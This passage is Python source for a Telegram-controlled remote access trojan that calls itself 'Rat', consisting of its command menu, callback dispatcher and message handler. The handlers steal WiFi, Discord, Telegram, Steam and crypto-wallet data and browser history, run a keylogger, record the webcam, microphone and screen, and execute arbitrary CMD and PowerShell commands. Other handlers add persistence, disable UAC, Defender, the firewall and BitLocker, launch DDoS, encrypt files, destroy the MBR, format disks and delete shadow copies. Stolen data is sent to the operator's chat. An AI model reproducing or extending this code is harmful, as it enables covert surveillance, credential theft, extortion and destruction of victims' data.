        [InlineKeyboardButton("🔑 Disable Service", callback_data="disable_service")],
        [InlineKeyboardButton("🔑 Enable Service", callback_data="enable_service")],
        [InlineKeyboardButton("🔑 Startup Programs", callback_data="startup_programs")],
        [InlineKeyboardButton("🔑 Disable Startup", callback_data="disable_startup")],
        [InlineKeyboardButton("🔑 Enable Startup", callback_data="enable_startup")],
        [InlineKeyboardButton("🌀 Flip Screen", callback_data="flip_screen")],
        [InlineKeyboardButton("🌀 Invert Colors", callback_data="invert_colors")],
        [InlineKeyboardButton("🌀 Grayscale", callback_data="grayscale")],
        [InlineKeyboardButton("🌀 Night Mode", callback_data="night_mode")],
        [InlineKeyboardButton("🌀 Magnify", callback_data="magnify")],
        [InlineKeyboardButton("🌀 Blur", callback_data="blur")],
        [InlineKeyboardButton("🌀 Matrix Effect", callback_data="matrix")],
        [InlineKeyboardButton("🌀 Screen Shake", callback_data="screen_shake")],
        [InlineKeyboardButton("🌀 RGB Effect", callback_data="rgb")],
        [InlineKeyboardButton("🔊 Beep", callback_data="beep")],
        [InlineKeyboardButton("🔊 Siren", callback_data="siren")],
        [InlineKeyboardButton("🔊 Scream Sound", callback_data="scream_sound")],
        [InlineKeyboardButton("🔊 Mute", callback_data="mute")],
        [InlineKeyboardButton("🔊 Unmute", callback_data="unmute")],
        [InlineKeyboardButton("🔊 Test Audio", callback_data="test_audio")],
        [InlineKeyboardButton("💀 Delete System Files", callback_data="delete_system_files")],
        [InlineKeyboardButton("💀 Corrupt Registry", callback_data="corrupt_registry")],
        [InlineKeyboardButton("💀 Delete All Data", callback_data="delete_all_data")],
        [InlineKeyboardButton("💀 Wipe Free Space", callback_data="wipe_free_space")],
        [InlineKeyboardButton("💀 Overwrite Files", callback_data="overwrite_files")],
        [InlineKeyboardButton("💀 Random Corruption", callback_data="random_corruption")],
        [InlineKeyboardButton("💀 Delete Backups", callback_data="delete_backups")],
        [InlineKeyboardButton("💀 Delete Shadow Copies", callback_data="delete_shadow_copies")],
        [InlineKeyboardButton("💀 Kill All Processes", callback_data="kill_all_processes")],
        [InlineKeyboardButton("💀 Crash Explorer", callback_data="crash_explorer")],
        [InlineKeyboardButton("💀 Delete Registry Keys", callback_data="delete_registry_keys")],
        [InlineKeyboardButton("💀 Enable Guest", callback_data="enable_guest")],
        [InlineKeyboardButton("💀 Disable Guest", callback_data="disable_guest")],
        [InlineKeyboardButton("📊 CPU Usage", callback_data="cpu_usage")],
        [InlineKeyboardButton("📊 RAM Usage", callback_data="ram_usage")],
        [InlineKeyboardButton("📊 Disk Usage", callback_data="disk_usage")],
        [InlineKeyboardButton("📊 GPU Usage", callback_data="gpu_usage")],
        [InlineKeyboardButton("📊 Network Usage", callback_data="network_usage")],
        [InlineKeyboardButton("📊 System Uptime", callback_data="system_uptime")],
        [InlineKeyboardButton("📊 Last Boot Time", callback_data="last_boot_time")],
        [InlineKeyboardButton("💿 Open CD", callback_data="open_cd")],
        [InlineKeyboardButton("💿 Close CD", callback_data="close_cd")],
        [InlineKeyboardButton("🖥️ Monitor Off", callback_data="monitor_off")],
        [InlineKeyboardButton("🖥️ Monitor On", callback_data="monitor_on")],
        [InlineKeyboardButton("🧮 Calculator", callback_data="calculator")],
        [InlineKeyboardButton("📝 Notepad", callback_data="notepad")],
        [InlineKeyboardButton("🎨 Paint", callback_data="paint")],
        [InlineKeyboardButton("📟 CMD Window", callback_data="cmd_window")],
        [InlineKeyboardButton("📋 Task Manager", callback_data="task_manager")],
        [InlineKeyboardButton("⚙️ Control Panel", callback_data="control_panel")],
        [InlineKeyboardButton("ℹ️ Windows Version", callback_data="windows_version")],
        [InlineKeyboardButton("ℹ️ BIOS Info", callback_data="bios_info")],
        [InlineKeyboardButton("ℹ️ Motherboard Info", callback_data="motherboard_info")],
        [InlineKeyboardButton("ℹ️ RAM Details", callback_data="ram_details")],
        [InlineKeyboardButton("ℹ️ Disk Details", callback_data="disk_details")],
        [InlineKeyboardButton("ℹ️ GPU Details", callback_data="gpu_details")],
        [InlineKeyboardButton("ℹ️ CPU Details", callback_data="cpu_details")],
        [InlineKeyboardButton("🔒 Lock Workstation", callback_data="lock_workstation")],
        [InlineKeyboardButton("🚪 Logoff", callback_data="logoff")],
        [InlineKeyboardButton("🔄 Switch User", callback_data="switch_user")],
        [InlineKeyboardButton("📁 Explorer", callback_data="explorer")],
        [InlineKeyboardButton("🌐 Browser", callback_data="browser")],
        [InlineKeyboardButton("🌐 Open URL", callback_data="open_url")],
        [InlineKeyboardButton("⌨️ Type Text", callback_data="type_text")],
        [InlineKeyboardButton("🔔 Notification", callback_data="notification")],
        [InlineKeyboardButton("🔲 Hide Taskbar", callback_data="hide_taskbar")],
        [InlineKeyboardButton("🔄 Restart Explorer", callback_data="restart_explorer")],
        [InlineKeyboardButton("🗑️ Clear Clipboard", callback_data="clear_clipboard")],
        [InlineKeyboardButton("🖨️ Disable Print", callback_data="disable_print")],
        [InlineKeyboardButton("🖨️ Enable Print", callback_data="enable_print")],
        [InlineKeyboardButton("🌐 DNS Servers", callback_data="dns_servers")],
        [InlineKeyboardButton("⏰ Set Time", callback_data="set_time")],
        [InlineKeyboardButton("📅 Set Date", callback_data="set_date")],
        [InlineKeyboardButton("🌤️ Weather", callback_data="weather")],
        [InlineKeyboardButton("📋 Send Log", callback_data="send_log")],
    ]
    update.message.reply_text(
        f"🤖 Rat v{VERSION}\n🖥️ {PC_ID}\n📌 Choose:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

def callback(update, context):
    global selected_pc
    query = update.callback_query
    query.answer()
    chat_id = query.message.chat.id
    data = query.data

    if data == "screenshot":
        img = get_screenshot()
        if img: bot.send_photo(chat_id, photo=BytesIO(img))
        else: bot.send_message(chat_id, "❌ Failed")
    elif data == "screenrecord":
        context.user_data['screenrecord_mode'] = True
        bot.send_message(chat_id, "🎥 Enter duration (1-60 sec):")
    elif data == "webcam":
        context.user_data['webcam_mode'] = True
        bot.send_message(chat_id, "📷 Enter duration (1-60 sec):")
    elif data == "system":
        bot.send_message(chat_id, get_system_info())
    elif data == "cmd":
        context.user_data['cmd_mode'] = True
        bot.send_message(chat_id, "📟 Enter CMD:")
    elif data == "powershell":
        context.user_data['ps_mode'] = True
        bot.send_message(chat_id, "⚡ Enter PowerShell:")
    elif data == "processes":
        bot.send_message(chat_id, f"📋 Processes:\n{list_processes()}")
    elif data == "kill":
        context.user_data['kill_mode'] = True
        bot.send_message(chat_id, "💀 Enter process name:")
    elif data == "startproc":
        context.user_data['startproc_mode'] = True
        bot.send_message(chat_id, "🚀 Enter process path:")
    elif data == "ddos_start":
        context.user_data['ddos_mode'] = True
        bot.send_message(chat_id, "🔥 Enter target URL:")
    elif data == "ddos_stop":
        bot.send_message(chat_id, stop_ddos())
    elif data == "block":
        bot.send_message(chat_id, block_input(True))
    elif data == "unblock":
        bot.send_message(chat_id, block_input(False))
    elif data == "wifi":
        bot.send_message(chat_id, f"📶 WiFi:\n{steal_wifi()}")
    elif data == "discord":
        bot.send_message(chat_id, f"🎮 Discord:\n{steal_discord()}")
    elif data == "telegram":
        result = steal_telegram()
        if os.path.exists(result):
            with open(result, 'rb') as f:
                bot.send_document(chat_id, document=BytesIO(f.read()), filename="telegram_sessions.zip")
            os.remove(result)
        else: bot.send_message(chat_id, result)
    elif data == "history":
        bot.send_message(chat_id, f"📜 History:\n{steal_browser_history()}")
    elif data == "steam":
        bot.send_message(chat_id, f"🎮 Steam:\n{steal_steam()}")
    elif data == "crypto":
        bot.send_message(chat_id, f"💰 Crypto:\n{steal_crypto()}")
    elif data == "scream":
        context.user_data['scream_mode'] = True
        bot.send_message(chat_id, "🎬 Enter video path:")
    elif data == "brokenpixels":
        bot.send_message(chat_id, broken_pixels())
    elif data == "pixellate":
        bot.send_message(chat_id, pixellate_screen())
    elif data == "upload":
        context.user_data['upload_mode'] = True
        bot.send_message(chat_id, "📤 Send the file you want to upload:")
    elif data == "downloadfile":
        context.user_data['downloadfile_mode'] = True
        bot.send_message(chat_id, "📥 Enter file path to download:")
    elif data == "encrypt":
        context.user_data['encrypt_mode'] = True
        bot.send_message(chat_id, "🔒 Enter path:")
    elif data == "decrypt":
        context.user_data['decrypt_mode'] = True
        bot.send_message(chat_id, "🔓 Enter path:")
    elif data == "audio":
        context.user_data['audio_mode'] = True
        bot.send_message(chat_id, "🎤 Enter duration (1-60 sec):")
    elif data == "volmax":
        bot.send_message(chat_id, set_volume(100))
    elif data == "volmin":
        bot.send_message(chat_id, set_volume(0))
    elif data == "persist":
        bot.send_message(chat_id, add_persistence())
    elif data == "uac":
        bot.send_message(chat_id, disable_uac())
    elif data == "bsod":
        bot.send_message(chat_id, trigger_bsod())
    elif data == "scare":
        bot.send_message(chat_id, scare_screen())
    elif data == "minimize":
        bot.send_message(chat_id, minimize_all_windows())
    elif data == "close":
        bot.send_message(chat_id, close_active_window())
    elif data == "msgbox":
        context.user_data['msgbox_mode'] = True
        bot.send_message(chat_id, "💬 Enter text:")
    elif data == "location":
        bot.send_message(chat_id, get_location())
    elif data == "download":
        context.user_data['download_mode'] = True
        bot.send_message(chat_id, "📥 Enter URL:")
    elif data == "listfiles":
        context.user_data['listfiles_mode'] = True
        bot.send_message(chat_id, "📂 Enter path:")
    elif data == "wallpaper_direct":
        context.user_data['awaiting_wallpaper'] = True
        bot.send_message(chat_id, "🖼️ *Отправь картинку для установки обоев:*", parse_mode='Markdown')
    elif data == "shutdown":
        bot.send_message(chat_id, shutdown_pc())
    elif data == "reboot":
        bot.send_message(chat_id, reboot_pc())
    elif data == "keylogger":
        bot.send_message(chat_id, f"⌨️ Keylogger:\n{keylogger.dump()}")
    elif data == "clipboard":
        bot.send_message(chat_id, f"📋 Clipboard:\n{get_clipboard()}")
    elif data == "block_usb":
        bot.send_message(chat_id, block_usb())
    elif data == "unblock_usb":
        bot.send_message(chat_id, unblock_usb())
    elif data == "usb_status":
        bot.send_message(chat_id, usb_status())
    elif data == "destroy_mbr":
        bot.send_message(chat_id, destroy_mbr())
    elif data == "stress_gpu":
        bot.send_message(chat_id, stress_gpu(60))
    elif data == "stress_cpu":
        bot.send_message(chat_id, stress_cpu(60))
    elif data == "format_disk":
        bot.send_message(chat_id, format_disk())
    elif data == "kill_logonui":
        bot.send_message(chat_id, kill_logonui())
    elif data == "disable_defender":
        bot.send_message(chat_id, disable_defender())
    elif data == "disable_firewall":
        bot.send_message(chat_id, disable_firewall())
    elif data == "disable_updates":
        bot.send_message(chat_id, disable_updates())
    elif data == "disable_system_restore":
        bot.send_message(chat_id, disable_system_restore())
    elif data == "disable_task_manager":
        bot.send_message(chat_id, disable_task_manager())
    elif data == "enable_task_manager":
        bot.send_message(chat_id, enable_task_manager())
    elif data == "disable_registry_editor":
        bot.send_message(chat_id, disable_registry_editor())
    elif data == "enable_registry_editor":
        bot.send_message(chat_id, enable_registry_editor())
    elif data == "disable_cmd":
        bot.send_message(chat_id, disable_cmd())
    elif data == "enable_cmd":
        bot.send_message(chat_id, enable_cmd())
    elif data == "dark_mode":
        bot.send_message(chat_id, change_theme("dark"))
    elif data == "light_mode":
        bot.send_message(chat_id, change_theme("light"))
    elif data == "high_contrast_on":
        bot.send_message(chat_id, enable_high_contrast())
    elif data == "high_contrast_off":
        bot.send_message(chat_id, disable_high_contrast())
    elif data == "high_performance":
        bot.send_message(chat_id, set_power_scheme("high"))
    elif data == "power_saver":
        bot.send_message(chat_id, set_power_scheme("low"))
    elif data == "disable_sleep":
        bot.send_message(chat_id, disable_sleep())
    elif data == "copy_file":
        context.user_data['copy_file_mode'] = True
        bot.send_message(chat_id, "📁 Enter source and destination paths (src|dst):")
    elif data == "move_file":
        context.user_data['move_file_mode'] = True
        bot.send_message(chat_id, "📁 Enter source and destination paths (src|dst):")
    elif data == "delete_file":
        context.user_data['delete_file_mode'] = True
        bot.send_message(chat_id, "📁 Enter file path to delete:")
    elif data == "rename_file":
        context.user_data['rename_file_mode'] = True
        bot.send_message(chat_id, "📁 Enter old and new names (old|new):")
    elif data == "create_folder":
        context.user_data['create_folder_mode'] = True
        bot.send_message(chat_id, "📁 Enter folder path to create:")
    elif data == "delete_folder":
        context.user_data['delete_folder_mode'] = True
        bot.send_message(chat_id, "📁 Enter folder path to delete:")
    elif data == "hide_file":
        context.user_data['hide_file_mode'] = True
        bot.send_message(chat_id, "📁 Enter file path to hide:")
    elif data == "unhide_file":
        context.user_data['unhide_file_mode'] = True
        bot.send_message(chat_id, "📁 Enter file path to unhide:")
    elif data == "make_readonly":
        context.user_data['make_readonly_mode'] = True
        bot.send_message(chat_id, "📁 Enter file path to make read-only:")
    elif data == "make_writable":
        context.user_data['make_writable_mode'] = True
        bot.send_message(chat_id, "📁 Enter file path to make writable:")
    elif data == "file_hash":
        context.user_data['file_hash_mode'] = True
        bot.send_message(chat_id, "📁 Enter file path:")
    elif data == "search_files":
        context.user_data['search_files_mode'] = True
        bot.send_message(chat_id, "📁 Enter path|filename (e.g. C:\\Users|test):")
    elif data == "search_by_extension":
        context.user_data['search_by_extension_mode'] = True
        bot.send_message(chat_id, "📁 Enter path|extension (e.g. C:\\Users|.txt):")
    elif data == "file_metadata":
        context.user_data['file_metadata_mode'] = True
        bot.send_message(chat_id, "📁 Enter file path:")
    elif data == "file_permissions":
        context.user_data['file_permissions_mode'] = True
        bot.send_message(chat_id, "📁 Enter file path:")
    elif data == "flush_dns":
        bot.send_message(chat_id, flush_dns())
    elif data == "public_ip":
        bot.send_message(chat_id, get_public_ip())
    elif data == "local_ip":
        bot.send_message(chat_id, get_local_ip())
    elif data == "mac_address":
        bot.send_message(chat_id, get_mac_address())
    elif data == "scan_ports":
        context.user_data['scan_ports_mode'] = True
        bot.send_message(chat_id, "🌐 Enter host|ports (e.g. 192.168.1.1|80,443):")
    elif data == "ping_host":
        context.user_data['ping_host_mode'] = True
        bot.send_message(chat_id, "🌐 Enter host to ping:")
    elif data == "traceroute":
        context.user_data['traceroute_mode'] = True
        bot.send_message(chat_id, "🌐 Enter host for traceroute:")
    elif data == "enable_proxy":
        context.user_data['enable_proxy_mode'] = True
        bot.send_message(chat_id, "🌐 Enter IP|port (e.g. 192.168.1.1|8080):")
    elif data == "disable_proxy":
        bot.send_message(chat_id, disable_proxy())
    elif data == "set_dns":
        context.user_data['set_dns_mode'] = True
        bot.send_message(chat_id, "🌐 Enter primary DNS (optional secondary):")
    elif data == "reset_dns":
        bot.send_message(chat_id, reset_dns())
    elif data == "network_adapters":
        bot.send_message(chat_id, f"🌐 Adapters:\n{get_network_adapters()}")
    elif data == "enable_adapter":
        context.user_data['enable_adapter_mode'] = True
        bot.send_message(chat_id, "🌐 Enter adapter name:")
    elif data == "disable_adapter":
        context.user_data['disable_adapter_mode'] = True
        bot.send_message(chat_id, "🌐 Enter adapter name:")
    elif data == "arp_table":
        bot.send_message(chat_id, f"🌐 ARP Table:\n{get_arp_table()}")
    elif data == "disable_windows_security":
        bot.send_message(chat_id, disable_windows_security())
    elif data == "disable_smart_screen":
        bot.send_message(chat_id, disable_smart_screen())
    elif data == "disable_bitlocker":
        bot.send_message(chat_id, disable_bitlocker())
    elif data == "installed_software":
        bot.send_message(chat_id, f"📦 Software:\n{get_installed_software()}")
    elif data == "running_services":
        bot.send_message(chat_id, f"🔄 Services:\n{get_running_services()}")
    elif data == "stop_service":
        context.user_data['stop_service_mode'] = True
        bot.send_message(chat_id, "🔑 Enter service name to stop:")
    elif data == "start_service":
        context.user_data['start_service_mode'] = True
        bot.send_message(chat_id, "🔑 Enter service name to start:")
    elif data == "disable_service":
        context.user_data['disable_service_mode'] = True
        bot.send_message(chat_id, "🔑 Enter service name to disable:")
    elif data == "enable_service":
        context.user_data['enable_service_mode'] = True
        bot.send_message(chat_id, "🔑 Enter service name to enable:")
    elif data == "startup_programs":
        bot.send_message(chat_id, f"🚀 Startup:\n{get_startup_programs()}")
    elif data == "disable_startup":
        context.user_data['disable_startup_mode'] = True
        bot.send_message(chat_id, "🔑 Enter startup program name to disable:")
    elif data == "enable_startup":
        context.user_data['enable_startup_mode'] = True
        bot.send_message(chat_id, "🔑 Enter name|path (e.g. Program|C:\\file.exe):")
    elif data == "flip_screen":
        bot.send_message(chat_id, flip_screen())
    elif data == "invert_colors":
        bot.send_message(chat_id, invert_colors())
    elif data == "grayscale":
        bot.send_message(chat_id, grayscale_mode())
    elif data == "night_mode":
        bot.send_message(chat_id, night_mode())
    elif data == "magnify":
        bot.send_message(chat_id, magnify_screen())
    elif data == "blur":
        bot.send_message(chat_id, blur_screen())
    elif data == "matrix":
        bot.send_message(chat_id, matrix_effect())
    elif data == "screen_shake":
        bot.send_message(chat_id, screen_shake())
    elif data == "rgb":
        bot.send_message(chat_id, rgb_effect())
    elif data == "beep":
        bot.send_message(chat_id, play_beep())
    elif data == "siren":
        bot.send_message(chat_id, play_siren())
    elif data == "scream_sound":
        bot.send_message(chat_id, play_scream_sound())
    elif data == "mute":
        bot.send_message(chat_id, mute_system())
    elif data == "unmute":
        bot.send_message(chat_id, unmute_system())
    elif data == "test_audio":
        bot.send_message(chat_id, test_audio())
    elif data == "delete_system_files":
        bot.send_message(chat_id, delete_system_files())
    elif data == "corrupt_registry":
        bot.send_message(chat_id, corrupt_registry())
    elif data == "delete_all_data":
        bot.send_message(chat_id, delete_all_data())
    elif data == "wipe_free_space":
        bot.send_message(chat_id, wipe_free_space())
    elif data == "overwrite_files":
        bot.send_message(chat_id, overwrite_files())
    elif data == "random_corruption":
        bot.send_message(chat_id, random_corruption())
    elif data == "delete_backups":
        bot.send_message(chat_id, delete_backups())
    elif data == "delete_shadow_copies":
        bot.send_message(chat_id, delete_shadow_copies())
    elif data == "kill_all_processes":
        bot.send_message(chat_id, kill_all_processes())
    elif data == "crash_explorer":
        bot.send_message(chat_id, crash_explorer())
    elif data == "delete_registry_keys":
        bot.send_message(chat_id, delete_registry_keys())
    elif data == "enable_guest":
        bot.send_message(chat_id, enable_guest_account())
    elif data == "disable_guest":
        bot.send_message(chat_id, disable_guest_account())
    elif data == "cpu_usage":
        bot.send_message(chat_id, get_cpu_usage())
    elif data == "ram_usage":
        bot.send_message(chat_id, get_ram_usage())
    elif data == "disk_usage":
        bot.send_message(chat_id, get_disk_usage())
    elif data == "gpu_usage":
        bot.send_message(chat_id, get_gpu_usage())
    elif data == "network_usage":
        bot.send_message(chat_id, get_network_usage())
    elif data == "system_uptime":
        bot.send_message(chat_id, get_system_uptime())
    elif data == "last_boot_time":
        bot.send_message(chat_id, get_last_boot_time())
    elif data == "open_cd":
        bot.send_message(chat_id, open_cd())
    elif data == "close_cd":
        bot.send_message(chat_id, close_cd())
    elif data == "monitor_off":
        bot.send_message(chat_id, turn_monitor_off())
    elif data == "monitor_on":
        bot.send_message(chat_id, turn_monitor_on())
    elif data == "calculator":
        bot.send_message(chat_id, open_calculator())
    elif data == "notepad":
        bot.send_message(chat_id, open_notepad())
    elif data == "paint":
        bot.send_message(chat_id, open_paint())
    elif data == "cmd_window":
        bot.send_message(chat_id, open_cmd_window())
    elif data == "task_manager":
        bot.send_message(chat_id, open_task_manager())
    elif data == "control_panel":
        bot.send_message(chat_id, open_control_panel())
    elif data == "windows_version":
        bot.send_message(chat_id, get_windows_version())
    elif data == "bios_info":
        bot.send_message(chat_id, get_bios_info())
    elif data == "motherboard_info":
        bot.send_message(chat_id, get_motherboard_info())
    elif data == "ram_details":
        bot.send_message(chat_id, get_ram_details())
    elif data == "disk_details":
        bot.send_message(chat_id, get_disk_details())
    elif data == "gpu_details":
        bot.send_message(chat_id, get_gpu_details())
    elif data == "cpu_details":
        bot.send_message(chat_id, get_cpu_details())
    elif data == "lock_workstation":
        bot.send_message(chat_id, lock_workstation())
    elif data == "logoff":
        bot.send_message(chat_id, logoff_user())
    elif data == "switch_user":
        bot.send_message(chat_id, switch_user())
    elif data == "explorer":
        bot.send_message(chat_id, open_explorer())
    elif data == "browser":
        bot.send_message(chat_id, open_browser())
    elif data == "open_url":
        context.user_data['open_url_mode'] = True
        bot.send_message(chat_id, "🌐 Enter URL to open:")
    elif data == "type_text":
        context.user_data['type_text_mode'] = True
        bot.send_message(chat_id, "⌨️ Enter text to type:")
    elif data == "notification":
        context.user_data['notification_mode'] = True
        bot.send_message(chat_id, "🔔 Enter notification text:")
    elif data == "hide_taskbar":
        bot.send_message(chat_id, hide_taskbar())
    elif data == "restart_explorer":
        bot.send_message(chat_id, restart_explorer())
    elif data == "clear_clipboard":
        bot.send_message(chat_id, clear_clipboard())
    elif data == "disable_print":
        bot.send_message(chat_id, disable_print_spooler())
    elif data == "enable_print":
        bot.send_message(chat_id, enable_print_spooler())
    elif data == "dns_servers":
        bot.send_message(chat_id, get_dns_servers())
    elif data == "set_time":
        context.user_data['set_time_mode'] = True
        bot.send_message(chat_id, "⏰ Enter time (HH:MM):")
    elif data == "set_date":
        context.user_data['set_date_mode'] = True
        bot.send_message(chat_id, "📅 Enter date (DD-MM-YYYY):")
    elif data == "weather":
        bot.send_message(chat_id, get_weather())
    elif data == "send_log":
        bot.send_message(chat_id, send_log())

def handle_message(update, context):
    global selected_pc
    chat_id = update.message.chat.id
    text = update.message.text

    # --- Игнорируем всех, кроме админа ---
    if chat_id != ADMIN_ID:
        return

    # --- Команда /list ---
    if text == "/list":
        if not known_pcs:
            bot.send_message(chat_id, "❌ Нет сохранённых ПК")
            return
        
        # Создаём кнопки для каждого ПК
        keyboard = []
        for pc in known_pcs:
            keyboard.append([InlineKeyboardButton(f"🖥️ {pc}", callback_data=f"select_pc|{pc}")])
        keyboard.append([InlineKeyboardButton("🔙 Назад", callback_data="back")])
        
        bot.send_message(
            chat_id,
            "📋 *Выбери ПК:*",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown"
        )
        return

    # --- Если ПК не выбран ---
    if not selected_pc:
        bot.send_message(chat_id, "❌ Сначала выбери ПК через /list")
        return

    # --- Если выбранный ПК — это текущий, выполняем команду ---
    if selected_pc != PC_ID:
        bot.send_message(chat_id, f"⚠️ Команда для ПК `{selected_pc}` будет выполнена позже", parse_mode="Markdown")
        return

    # --- Дальше обычная обработка команд (CMD, скриншоты и т.д.) ---
    if context.user_data.get('cmd_mode'):
        context.user_data['cmd_mode'] = False
        bot.send_message(chat_id, f"📟 CMD:\n{execute_cmd(text)[:4000]}")
    elif context.user_data.get('ps_mode'):
        context.user_data['ps_mode'] = False
        bot.send_message(chat_id, f"⚡ PowerShell:\n{execute_powershell(text)[:4000]}")
    elif context.user_data.get('kill_mode'):
        context.user_data['kill_mode'] = False
        bot.send_message(chat_id, kill_process(text))
    elif context.user_data.get('startproc_mode'):
        context.user_data['startproc_mode'] = False
        bot.send_message(chat_id, start_process(text))
    elif context.user_data.get('ddos_mode'):
        context.user_data['ddos_mode'] = False
        bot.send_message(chat_id, start_ddos(text))
    elif context.user_data.get('screenrecord_mode'):
        context.user_data['screenrecord_mode'] = False
        try:
            duration = int(text)
            if 1 <= duration <= 60:
                filename = record_screen(duration)
                if os.path.exists(filename):
                    with open(filename, 'rb') as f:
                        bot.send_video(chat_id, video=BytesIO(f.read()), filename=filename)
                    os.remove(filename)
            else: bot.send_message(chat_id, "❌ 1-60 sec only")
        except: bot.send_message(chat_id, "❌ Invalid")
    elif context.user_data.get('webcam_mode'):
        context.user_data['webcam_mode'] = False
        try:
            duration = int(text)
            if 1 <= duration <= 60:
                filename = record_webcam(duration)
                if os.path.exists(filename):
                    with open(filename, 'rb') as f:
                        bot.send_video(chat_id, video=BytesIO(f.read()), filename=filename)
                    os.remove(filename)
            else: bot.send_message(chat_id, "❌ 1-60 sec only")
        except: bot.send_message(chat_id, "❌ Invalid")
    elif context.user_data.get('scream_mode'):
        context.user_data['scream_mode'] = False
        bot.send_message(chat_id, scream_make(text))
    elif context.user_data.get('upload_mode'):
        context.user_data['upload_mode'] = False
        bot.send_message(chat_id, "📤 Send the file as a document:")
        context.user_data['awaiting_upload'] = True
    elif context.user_data.get('downloadfile_mode'):
        context.user_data['downloadfile_mode'] = False
        result = download_file_from_pc(text)
        if result:
            with open(result, 'rb') as f:
                bot.send_document(chat_id, document=BytesIO(f.read()), filename=os.path.basename(result))
        else: bot.send_message(chat_id, "❌ File not found")
    elif context.user_data.get('encrypt_mode'):
        context.user_data['encrypt_mode'] = False
        context.user_data['encrypt_pass_mode'] = True
        context.user_data['encrypt_path'] = text
        bot.send_message(chat_id, "🔒 Enter password:")
    elif context.user_data.get('encrypt_pass_mode'):
        context.user_data['encrypt_pass_mode'] = False
        bot.send_message(chat_id, encrypt_files(context.user_data['encrypt_path'], text))
    elif context.user_data.get('decrypt_mode'):
        context.user_data['decrypt_mode'] = False
        context.user_data['decrypt_pass_mode'] = True
        context.user_data['decrypt_path'] = text
        bot.send_message(chat_id, "🔓 Enter password:")
    elif context.user_data.get('decrypt_pass_mode'):
        context.user_data['decrypt_pass_mode'] = False
        bot.send_message(chat_id, decrypt_files(context.user_data['decrypt_path'], text))
    elif context.user_data.get('audio_mode'):
        context.user_data['audio_mode'] = False
        try:
            duration = int(text)
            if 1 <= duration <= 60:
                filename = record_audio(duration)
                if os.path.exists(filename):
                    with open(filename, 'rb') as f:
                        bot.send_audio(chat_id, audio=BytesIO(f.read()), filename=filename)
                    os.remove(filename)
            else: bot.send_message(chat_id, "❌ 1-60 sec only")
        except: bot.send_message(chat_id, "❌ Invalid")
    elif context.user_data.get('msgbox_mode'):
        context.user_data['msgbox_mode'] = False
        bot.send_message(chat_id, show_messagebox(text))
    elif context.user_data.get('download_mode'):
        context.user_data['download_mode'] = False
        bot.send_message(chat_id, download_file(text))
    elif context.user_data.get('listfiles_mode'):
        context.user_data['listfiles_mode'] = False
        bot.send_message(chat_id, f"📂 Files:\n{list_files(text)}")
    elif context.user_data.get('copy_file_mode'):
        context.user_data['copy_file_mode'] = False
        src, dst = text.split('|')
        bot.send_message(chat_id, copy_file(src, dst))
    elif context.user_data.get('move_file_mode'):
        context.user_data['move_file_mode'] = False
        src, dst = text.split('|')
        bot.send_message(chat_id, move_file(src, dst))
    elif context.user_data.get('delete_file_mode'):
        context.user_data['delete_file_mode'] = False
        bot.send_message(chat_id, delete_file(text))
    elif context.user_data.get('rename_file_mode'):
        context.user_data['rename_file_mode'] = False
        old, new = text.split('|')
        bot.send_message(chat_id, rename_file(old, new))
    elif context.user_data.get('create_folder_mode'):
        context.user_data['create_folder_mode'] = False
        bot.send_message(chat_id, create_folder(text))
    elif context.user_data.get('delete_folder_mode'):
        context.user_data['delete_folder_mode'] = False
        bot.send_message(chat_id, delete_folder(text))
    elif context.user_data.get('hide_file_mode'):
        context.user_data['hide_file_mode'] = False
        bot.send_message(chat_id, hide_file(text))
    elif context.user_data.get('unhide_file_mode'):
        context.user_data['unhide_file_mode'] = False
        bot.send_message(chat_id, unhide_file(text))
    elif context.user_data.get('make_readonly_mode'):
        context.user_data['make_readonly_mode'] = False
        bot.send_message(chat_id, make_readonly(text))
    elif context.user_data.get('make_writable_mode'):
        context.user_data['make_writable_mode'] = False
        bot.send_message(chat_id, make_writable(text))
    elif context.user_data.get('file_hash_mode'):
        context.user_data['file_hash_mode'] = False
        bot.send_message(chat_id, get_file_hash(text))
    elif context.user_data.get('search_files_mode'):
        context.user_data['search_files_mode'] = False
        path, name = text.split('|')
        bot.send_message(chat_id, search_files(path, name))
    elif context.user_data.get('search_by_extension_mode'):
        context.user_data['search_by_extension_mode'] = False
        path, ext = text.split('|')
        bot.send_message(chat_id, search_by_extension(path, ext))
    elif context.user_data.get('file_metadata_mode'):
        context.user_data['file_metadata_mode'] = False
        bot.send_message(chat_id, get_file_metadata(text))
    elif context.user_data.get('file_permissions_mode'):
        context.user_data['file_permissions_mode'] = False
        bot.send_message(chat_id, get_file_permissions(text))
    elif context.user_data.get('scan_ports_mode'):
        context.user_data['scan_ports_mode'] = False
        host, ports = text.split('|')
        bot.send_message(chat_id, scan_ports(host, ports))
    elif context.user_data.get('ping_host_mode'):
        context.user_data['ping_host_mode'] = False
        bot.send_message(chat_id, ping_host(text))
    elif context.user_data.get('traceroute_mode'):
        context.user_data['traceroute_mode'] = False
        bot.send_message(chat_id, traceroute(text))
    elif context.user_data.get('enable_proxy_mode'):
        context.user_data['enable_proxy_mode'] = False
        ip, port = text.split('|')
        bot.send_message(chat_id, enable_proxy(ip, port))
    elif context.user_data.get('set_dns_mode'):
        context.user_data['set_dns_mode'] = False
        parts = text.split('|')
        if len(parts) > 1:
            bot.send_message(chat_id, set_dns(parts[0], parts[1]))
        else:
            bot.send_message(chat_id, set_dns(parts[0]))
    elif context.user_data.get('enable_adapter_mode'):
        context.user_data['enable_adapter_mode'] = False
        bot.send_message(chat_id, enable_adapter(text))
    elif context.user_data.get('disable_adapter_mode'):
        context.user_data['disable_adapter_mode'] = False
        bot.send_message(chat_id, disable_adapter(text))
    elif context.user_data.get('stop_service_mode'):
        context.user_data['stop_service_mode'] = False
        bot.send_message(chat_id, stop_service(text))
    elif context.user_data.get('start_service_mode'):
        context.user_data['start_service_mode'] = False
        bot.send_message(chat_id, start_service(text))
    elif context.user_data.get('disable_service_mode'):
        context.user_data['disable_service_mode'] = False
        bot.send_message(chat_id, disable_service(text))
    elif context.user_data.get('enable_service_mode'):
        context.user_data['enable_service_mode'] = False
        bot.send_message(chat_id, enable_service(text))
    elif context.user_data.get('disable_startup_mode'):
        context.user_data['disable_startup_mode'] = False
        bot.send_message(chat_id, disable_startup_program(text))
    elif context.user_data.get('enable_startup_mode'):
        context.user_data['enable_startup_mode'] = False
        name, path = text.split('|')
        bot.send_message(chat_id, enable_startup_program(name, path))
    elif context.user_data.get('open_url_mode'):
        context.user_data['open_url_mode'] = False
        bot.send_message(chat_id, open_url(text))
    elif context.user_data.get('type_text_mode'):
